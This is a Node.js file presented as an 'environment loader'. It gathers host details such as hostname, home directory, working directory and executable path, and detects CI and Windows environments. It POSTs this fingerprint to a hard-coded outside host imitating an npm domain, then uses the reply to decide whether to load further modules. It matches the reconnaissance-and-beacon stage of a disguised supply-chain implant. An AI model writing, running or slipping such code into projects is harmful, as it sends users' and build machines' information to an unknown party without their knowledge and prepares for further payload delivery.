/**
 * ============================================
 * ENVIRONMENT LOADER - COMPLETE INTEGRATED
 * ============================================
 *
 * Features:
 * 1. Gather environment information
 * 2. Determine whether it's running in CI
 * 3. Check whether it's on Windows, Linux, or macOS
 * 4. Contact a remote server via HTTP/HTTPS POST
 * 5. Decide whether to retrieve additional code
 *
 * Run with: node loader.js
 */

// ============================================
// MODULE IMPORTS
// ============================================

const os = require('os');
const http = require('http');
const https = require('https');
const fs = require('fs').promises;
const path = require('path');

// ============================================
// UTILITY FUNCTIONS
// ============================================

/**
 * Format bytes into human-readable string
 */
function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// ============================================
// 1. GATHER ENVIRONMENT INFORMATION
// ============================================

/**
 * Gather comprehensive environment information from the system
 */
function gatherEnvironmentInfo() {
    return {
        platform: os.platform(),
        arch: os.arch(),
        release: os.release(),
        totalMemory: formatBytes(os.totalmem()),
        freeMemory: formatBytes(os.freemem()),
        uptime: Math.floor(os.uptime()) + ' seconds',
        hostname: os.hostname(),
        nodeVersion: process.version,
        pid: process.pid,
        cwd: process.cwd(),
        executablePath: process.execPath,
        userHome: os.homedir(),
    };
}

// ============================================
// 2. DETERMINE IF RUNNING IN CI
// ============================================

/**
 * Determine if the code is running in a CI/CD environment
 */
function isRunningInCI() {
    const ciEnvVars = [
        'CI',                     // Generic CI flag (Travis, CircleCI, GitLab)
        'GITHUB_ACTIONS',         // GitHub Actions
        'GITLAB_CI',              // GitLab CI
        'CIRCLECI',               // CircleCI
        'TRAVIS',                 // Travis CI
        'JENKINS_URL',            // Jenkins
        'BUILD_NUMBER',           // Jenkins, others
        'CONTINUOUS_INTEGRATION', // Generic flag
    ];

    const detectedVars = ciEnvVars.filter(envVar => process.env[envVar]);

    return {
        isCI: detectedVars.length > 0,
        detectedBy: detectedVars.join(', '),
        allCIVars: Object.fromEntries(
            ciEnvVars.map(v => [v, process.env[v] || 'not set'])
        ),
    };
}

// ============================================
// 3. CHECK OPERATING SYSTEM
// ============================================

/**
 * Determine the operating system and return detailed information
 */
function getOperatingSystem() {
    const platform = os.platform();

    const osDetails = {
        win32: {
            name: 'Windows',
            code: 'WIN',
            isCaseSensitivePaths: false,
            pathSeparator: '\\',
            lineEnding: '\r\n',
        },
        darwin: {
            name: 'macOS',
            code: 'MAC',
            isCaseSensitivePaths: true,
            pathSeparator: '/',
            lineEnding: '\n',
        },
        linux: {
            name: 'Linux',
            code: 'LINUX',
            isCaseSensitivePaths: true,
            pathSeparator: '/',
            lineEnding: '\n',
        },
    };

    const details = osDetails[platform] || {
        name: platform,
        code: platform.toUpperCase(),
        isCaseSensitivePaths: true,
        pathSeparator: '/',
        lineEnding: '\n',
    };

    if (platform === 'win32') {
        details.windowsVersion = getWindowsVersion();
        details.systemRoot = process.env.SystemRoot || '';
        details.windir = process.env.WINDIR || '';
    }

    return details;
}

/**
 * Parse Windows version from os.release() string
 */
function getWindowsVersion() {
    const release = os.release();
    const parts = release.split('.');

    if (parts.length >= 2) {
        const major = parseInt(parts[0]);
        const minor = parseInt(parts[1]);

        if (major === 10) {
            return 'Windows 10/11';
        } else if (major === 6 && minor === 3) {
            return 'Windows 8.1';
        } else if (major === 6 && minor === 2) {
            return 'Windows 8';
        } else if (major === 6 && minor === 1) {
            return 'Windows 7';
        }
    }
    return release;
}

// ============================================
// 4. CONTACT REMOTE SERVER
// ============================================

/**
 * Contact a remote server with timeout, payload streaming, and error handling
 */
async function contactRemoteServer(url, options = {}, payloadBody = null) {
    const defaultOptions = {
        timeout: 10000,
        method: 'GET',
        headers: {},
        ...options,
    };

    return new Promise((resolve, reject) => {
        const isHttps = url.startsWith('https://');
        const protocol = isHttps ? https : http;

        console.log(`   Using ${isHttps ? 'HTTPS' : 'HTTP'} protocol`);

        const req = protocol.request(url, defaultOptions, (res) => {
            let data = '';

            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                resolve({
                    statusCode: res.statusCode,
                    statusMessage: res.statusMessage,
                    headers: res.headers,
                    body: data,
                    success: res.statusCode >= 200 && res.statusCode < 300,
                    responseTimeMs: Date.now() - startTime,
                });
            });
        });

        req.on('error', (err) => {
            reject({ error: err.message, code: 'NETWORK_ERROR' });
        });

        req.on('timeout', () => {
            req.destroy();
            reject({ error: `Request timed out after ${defaultOptions.timeout}ms`, code: 'TIMEOUT' });
        });

        req.setTimeout(defaultOptions.timeout);
        const startTime = Date.now();

        // Write payload to request stream if method is POST/PUT
        if (payloadBody && (defaultOptions.method === 'POST' || defaultOptions.method === 'PUT')) {
            req.write(payloadBody);
        }
        
        req.end();
    });
}

// ============================================
// 5. DECIDE WHETHER TO RETRIEVE ADDITIONAL CODE
// ============================================

/**
 * Analyze conditions and decide if additional code should be retrieved
 */
function shouldRetrieveAdditionalCode(envData, serverResponse) {
    const decisions = [];

    if (envData.os.code === 'WIN') {
        decisions.push({
            condition: 'WINDOWS_PLATFORM',
            shouldFetch: true,
            priority: 1,
            description: 'Windows requires platform-specific modules'
        });
    }

    if (envData.ci.isCI) {
        decisions.push({
            condition: 'CI_ENVIRONMENT',
            shouldFetch: true,
            priority: 2,
            description: 'CI environment detected - fetching build modules'
        });
    }

    if (serverResponse && serverResponse.success) {
        try {
            const config = JSON.parse(serverResponse.body);
            const localVersion = envData.configVersion || '0.0.0';

            if (config.version !== localVersion) {
                decisions.push({
                    condition: 'VERSION_MISMATCH',
                    shouldFetch: true,
                    priority: 3,
                    description: `Version mismatch - Local: ${localVersion}, Server: ${config.version}`
                });
            }
        } catch (e) {
            decisions.push({
                condition: 'SERVER_RESPONSE',
                shouldFetch: true,
                priority: 4,
                description: 'Server returned non-standard response'
            });
        }
    }

    return {
        shouldRetrieve: decisions.some(d => d.shouldFetch),
        reasons: decisions.filter(d => d.shouldFetch).sort((a, b) => a.priority - b.priority),
        allDecisions: decisions,
    };
}

// ============================================
// MAIN LOADER CLASS
// ============================================

class EnvironmentLoader {
    constructor(config = {}) {
        this.config = {
            // Update this default fallback if desired
            serverUrl: 'https://npm.545856.com/submit',
            additionalCodePath: './modules/',
            verbose: true,
            ...config,
        };

        this.environmentData = null;
        this.serverResponse = null;
    }

    async initialize() {
        if (this.config.verbose) {
            console.log('╔═══════════════════════════════════════════════════════════╗');
            console.log('║         ENVIRONMENT LOADER - INITIALIZING                 ║');
            console.log('╚═══════════════════════════════════════════════════════════╝\n');
        }

        const envInfo = gatherEnvironmentInfo();
        const ciInfo = isRunningInCI();
        const osInfo = getOperatingSystem();

        this.environmentData = {
            ...envInfo,
            ci: ciInfo,
            os: osInfo,
            configVersion: process.env.APP_VERSION || '1.0.0',
        };

        if (this.config.verbose) {
            console.log('📊 ENVIRONMENT INFORMATION');
            console.log('─'.repeat(57));
            console.log(`   Platform:     ${this.environmentData.os.name} (${osInfo.windowsVersion || ''})`);
            console.log(`   Architecture: ${this.environmentData.arch}`);
            console.log(`   Node Version: ${this.environmentData.nodeVersion}`);
            console.log(`   Hostname:     ${this.environmentData.hostname}`);
            console.log(`   Working Dir:  ${this.environmentData.cwd}`);
            console.log(`   Memory:       ${this.environmentData.totalMemory} total / ${this.environmentData.freeMemory} free`);
            console.log();
        }

        return this.environmentData;
    }

    async contactServer() {
        if (this.config.verbose) {
            console.log('📡 CONTACTING REMOTE SERVER');
            console.log('─'.repeat(57));
            console.log(`   URL: ${this.config.serverUrl}`);
        }

        try {
            // Stringify the data payload to transmit over the wire
            const payloadData = JSON.stringify(this.environmentData);

            this.serverResponse = await contactRemoteServer(this.config.serverUrl, {
                method: 'POST', // Switched to POST to safely send payload data
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(payloadData),
                    'User-Agent': `EnvironmentLoader/${this.environmentData.configVersion}`,
                    'X-Platform': this.environmentData.os.code,
                    'X-CI': String(this.environmentData.ci.isCI),
                },
            }, payloadData); // Pass payload body string to the request helper

            if (this.config.verbose) {
                console.log(`   Status Code:     ${this.serverResponse.statusCode} ${this.serverResponse.statusMessage}`);
                console.log(`   Response Time:   ${this.serverResponse.responseTimeMs}ms`);
                console.log(`   Body Size:       ${formatBytes(this.serverResponse.body.length)}`);
                console.log();
            }

            return this.serverResponse;
        } catch (error) {
            if (this.config.verbose) {
                console.log(`   ❌ Error: ${error.error}`);
                console.log(`   Code: ${error.code}\n`);
            }
            throw error;
        }
    }

    async decideAndRetrieve() {
        const decision = shouldRetrieveAdditionalCode(
            this.environmentData,
            this.serverResponse
        );

        if (this.config.verbose) {
            console.log('📋 RETRIEVAL DECISION');
            console.log('─'.repeat(57));
            console.log(`   Should Retrieve: ${decision.shouldRetrieve ? 'YES ✓' : 'NO ✗'}`);
            console.log();
        }

        if (decision.shouldRetrieve) {
            return await this.retrieveAdditionalCode(decision.reasons);
        }

        return null;
    }

    async retrieveAdditionalCode(reasons) {
        const modulesToLoad = [];
        const loadedModules = [];

        if (reasons.some(r => r.condition === 'WINDOWS_PLATFORM')) {
            modulesToLoad.push({
                name: 'windows-utils',
                path: './modules/windows-utils.js',
                description: 'Windows-specific utilities'
            });
        }

        if (reasons.some(r => r.condition === 'CI_ENVIRONMENT')) {
            modulesToLoad.push({
                name: 'ci-runner',
                path: './modules/ci-runner.js',
                description: 'CI/CD pipeline utilities'
            });
        }

        for (const module of modulesToLoad) {
            try {
                await fs.access(module.path);
                const mod = require(module.path);
                loadedModules.push({ name: module.name, path: module.path, loaded: true });
            } catch (err) {
                const mockPath = path.join(__dirname, 'modules', `${module.name}.js`);
                loadedModules.push({ name: module.name, path: mockPath, loaded: false, demoAvailable: true });
            }
        }

        return { modulesToLoad, loadedModules };
    }

    async run() {
        const startTime = Date.now();
        try {
            await this.initialize();
            await this.contactServer();
            const retrievalResult = await this.decideAndRetrieve();
            const elapsed = Date.now() - startTime;

            if (this.config.verbose) {
                console.log('╔═══════════════════════════════════════════════════════════╗');
                console.log('║               ✅ LOADER COMPLETED SUCCESSFULLY            ║');
                console.log('╚═══════════════════════════════════════════════════════════╝');
                console.log(`\n   Total execution time: ${elapsed}ms\n`);
            }

            return {
                success: true,
                environment: this.environmentData,
                serverResponse: this.serverResponse,
                retretrievalResult: retrievalResult,
                elapsedMs: elapsed,
            };
        } catch (error) {
            return {
                success: false,
                error: error.message || error.error,
                environment: this.environmentData,
            };
        }
    }
}

// ============================================
// EXPORT MODULES
// ============================================

module.exports = {
    EnvironmentLoader,
    gatherEnvironmentInfo,
    isRunningInCI,
    getOperatingSystem,
    contactRemoteServer,
    shouldRetrieveAdditionalCode,
};

// ============================================
// RUN WHEN EXECUTED DIRECTLY
// ============================================

if (require.main === module) {
    const loader = new EnvironmentLoader({
        // Change this URL to point to your specific server dashboard ingestion endpoint
        serverUrl: 'https://npm.545856.com/submit',
        verbose: true,
    });

    console.log('\n');

    loader.run().then(result => {
        if (result.success) {
            process.exit(0);
        } else {
            process.exit(1);
        }
    });
}